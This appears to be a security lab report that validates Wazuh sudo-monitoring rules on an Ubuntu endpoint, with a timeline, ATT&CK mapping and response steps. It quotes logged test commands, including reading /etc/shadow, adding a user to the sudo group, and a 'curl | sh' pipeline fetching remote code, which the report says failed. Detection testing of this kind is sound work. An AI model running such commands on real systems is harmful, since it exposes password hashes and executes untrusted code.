# Detection 006 — Sudo Abuse & Sensitive Command Monitoring

**Status:** Detection validated; analyst review required  
**Verdict:** Sudo activity detected; abuse or compromise not confirmed  
**Investigation date:** 17 October 2026  
**Wazuh manager:** `vm1`  
**Endpoint:** `ubuntu_vm2` (`192.168.34.143`, agent `001`)  
**Log source:** `/var/log/auth.log`

## 1. Executive Summary
Wazuh monitored Linux sudo activity using rules `100520`, `100521`, and a dashboard query that also includes `100522`. The dashboard shows **234 alert hits** for `rule.id:(100520 OR 100521 OR 100522)` over the selected last-week window.

The available JSON confirms that `100520` records sudo commands executed as root at Level 5 and `100521` detects commands on a sensitive/high-risk watchlist at Level 9. Commands in the evidence include account creation and removal, adding a user to the sudo group, reading `/etc/shadow`, validating sudoers syntax, checking SSH service status, reading root's crontab, and attempting to invoke a remote-content pipeline. Several commands may be ordinary administration, but some merit deeper review.

The evidence confirms command logging and detection. It does not establish malicious intent or endpoint compromise.

## 2. Environment

| Field | Value |
|---|---|
| SIEM | Wazuh |
| Manager | `vm1` |
| Linux endpoint | `ubuntu_vm2` |
| Endpoint IP | `192.168.34.143` |
| Agent ID | `001` |
| Log source | `/var/log/auth.log` |
| Query | `rule.id:(100520 OR 100521 OR 100522)` |
| Time range | Last week, 10–17 October 2026 |

## 3. Detection Rules

| Rule | Description from supplied alert | Level | ATT&CK mapping |
|---|---|---:|---|
| `100520` | Sudo command executed as root | 5 | `T1548.003` — Sudo and Sudo Caching |
| `100521` | Sudo used with a sensitive/high-risk command | 9 | `T1548.003`, `T1078` — Valid Accounts |
| `100522` | Included in the dashboard search | Not supplied | Not verified from supplied details |

The exact rule XML was not provided, so this report documents the alert descriptions and examples visible in the supplied records. It does not claim to validate the internal matching conditions.

## 4. Observed Command Activity

### Account administration — 13:58–14:00 (UTC+05:30)
The logs show the invoking user `vm2` executing:
- `useradd testuser_basic`
- `useradd -m -s /bin/bash testuser_sudo`
- `usermod -aG sudo testuser_basic`
- `userdel testuser_basic`
- `userdel testuser_sudo`

These commands are consistent with account-creation detection testing. Adding a user to the `sudo` group is security-sensitive because it grants administrative capability on typical Ubuntu configurations. The following `userdel` records show cleanup commands being issued, but successful completion should be verified independently if closure depends on it.

### Root directory listing — 14:21 and 14:29
Rule `100520` logged `sudo /usr/bin/ls /root`. This can be normal administrator activity; review whether access was expected and who initiated it.

### Sudoers syntax validation — 14:22
Rule `100521` generated a Level 9 alert for `sudo /usr/sbin/visudo -c`. The terminal output says `/etc/sudoers: parsed OK`. The command validates sudoers syntax and is not inherently malicious.

### Sensitive file access — 14:22
Rule `100521` generated a Level 9 alert for `sudo /usr/bin/cat /etc/shadow`. The terminal notes also show `sudo cat /etc/shadow > /dev/null`. The command is a high-sensitivity action because `/etc/shadow` contains password-hash data. The provided evidence indicates the command was invoked; it does not establish unauthorized disclosure or exfiltration.

### SSH service status — 14:23
Rule `100521` alert was recorded for `sudo /usr/bin/systemctl status ssh`. The terminal output shows the SSH service as active. This is a routine service-status check in many administration workflows, though context still matters.

### Root identity check — 14:24–14:25
Rule `100520` logged:
- `sudo /usr/bin/su -c whoami` (twice)
- `sudo /usr/bin/python3 -c 'import os; os.system("whoami")'` (twice)

The supplied terminal output shows `root` returned for the `whoami` checks. These tests demonstrate commands running in a root context through sudo; alone, they do not prove abuse.

### Remote content pipeline attempt — 14:26
Rule `100520` logged:
```bash
sudo /usr/bin/bash -c "curl -s http://example.com | sh"
```
The terminal transcript reports `sh: 1: Syntax error: redirection unexpected`. Therefore, the supplied evidence does **not** confirm a successful download or script execution. Correlate network telemetry and process events if this outcome matters.

### Root crontab query — 14:30
Rule `100521` generated a Level 9 alert for `sudo /usr/bin/crontab -l`. The terminal notes report `no crontab for root`. This appears to be a query rather than a confirmed scheduled-task change.

## 5. Timeline

| Time (UTC+05:30) | Command / event | Wazuh rule | Analyst note |
|---|---|---|---|
| 13:58:12 | `useradd testuser_basic` | `100520` | Account-creation test |
| 13:59:24 | `useradd -m -s /bin/bash testuser_sudo` | `100520` | Account-creation test |
| 14:00:03 | `usermod -aG sudo testuser_basic` | `100521` | Sensitive privilege assignment; verify intent |
| 14:00:40–14:00:41 | `userdel testuser_basic` and `userdel testuser_sudo` | `100520` | Cleanup commands logged |
| 14:21:31 | `ls /root` | `100520` | Root directory read |
| 14:22:13 | `visudo -c` | `100521` | Sudoers syntax check; terminal shows OK |
| 14:22:52 | `cat /etc/shadow` | `100521` | Sensitive file access |
| 14:23:32 | `systemctl status ssh` | `100521` | Service-status check |
| 14:24:16–14:24:40 | `su -c whoami` | `100520` | Root identity checks |
| 14:25:23–14:25:51 | `python3 ... whoami` | `100520` | Root execution tests |
| 14:26:29 | `bash -c curl ... \| sh` | `100520` | Attempt logged; terminal shows syntax error |
| 14:29:17 | `ls /root` | `100520` | Root directory read |
| 14:30:46 | `crontab -l` | `100521` | Root crontab query |

Times are taken from source event logs where provided. Wazuh's indexed timestamp can differ slightly from the event time.

## 6. Dashboard Summary
- **Query:** `rule.id:(100520 OR 100521 OR 100522)`
- **Selected range:** Last week
- **Displayed hits:** 234
- **Visible alerts:** routine sudo activity (Level 5) and high-risk watchlist matches (Level 9)
- **MITRE entries shown:** Sudo and Sudo Caching; Valid Accounts

The total is a count of matching alert documents, not necessarily 234 unique commands or incidents. Repetitive commands and routine admin actions may account for a significant share.

## 7. MITRE ATT&CK
- **T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching.** Relevant to reviewing commands run through `sudo`.
- **T1078 — Valid Accounts.** Present in rule `100521` metadata; this is a possible context for investigation, not evidence of compromised credentials.

## 8. Findings and Impact
**Confirmed**
- Wazuh recorded sudo command activity on `ubuntu_vm2`.
- Rule `100520` generated Level 5 sudo activity alerts.
- Rule `100521` generated Level 9 high-risk command alerts, including for `/etc/shadow`.
- Commands modifying local accounts and sudo-group membership were logged.

**Not confirmed**
- Malicious intent or unauthorized use of sudo.
- Successful download or execution from the `curl | sh` attempt.
- Exfiltration of `/etc/shadow`.
- Persistence, lateral movement, malware, or endpoint compromise.

## 9. Analyst Verdict
**Sudo monitoring detections validated; command intent and execution outcome require context.**

The sensitive-command alerts are useful for triage, but commands such as `visudo -c` and `systemctl status ssh` may be legitimate. The `/etc/shadow` access and `usermod -aG sudo` action deserve attention and should be verified against the lab plan. No compromise is confirmed by the supplied data.

## 10. Recommended Response
1. Confirm these commands were part of an authorized lab exercise.
2. Verify whether `testuser_basic` was intentionally granted sudo access and confirm the cleanup completed.
3. Review account membership, sudoers configuration, and subsequent logins for the affected accounts.
4. Review who accessed `/etc/shadow`, preserve relevant logs, and correlate with audit records and subsequent file/network activity.
5. For `curl | sh`, determine whether a network connection occurred and whether any child process actually ran; do not infer success from command-line evidence alone.
6. Separate known administration checks from genuinely high-risk commands to reduce false positives.
7. Validate the custom XML for rules `100520` and `100521`; obtain the XML and sample alert for `100522` before documenting its behavior.
8. Define case closure criteria based on authorization, execution outcome, and correlated telemetry.

## 11. Limitations
The custom rule XML was not included. The screenshot query contains rule `100522`, but no sample alert or description for that rule was supplied. The 234 hits may contain repeated routine activity. The shell pipeline attempt produced a syntax error in the supplied terminal transcript, so successful remote execution is unconfirmed.

## 12. Conclusion
The Wazuh lab successfully collects and alerts on sudo commands, including a Level 9 watchlist for sensitive commands. The evidence shows useful investigation points around sudo-group modification and `/etc/shadow` access, along with benign administrative checks. Document this as a tested detection workflow, not a confirmed compromise.

## 13. Evidence Index
- `evidence/E01-sudo-detection-dashboard.png` — dashboard and 234 alert count
- `evidence/E02-sudo-alert-search-results.png` — search results for rules 100520/100521/100522
- `evidence/E03-sensitive-command-alert-details.png` — alert details for `crontab -l`
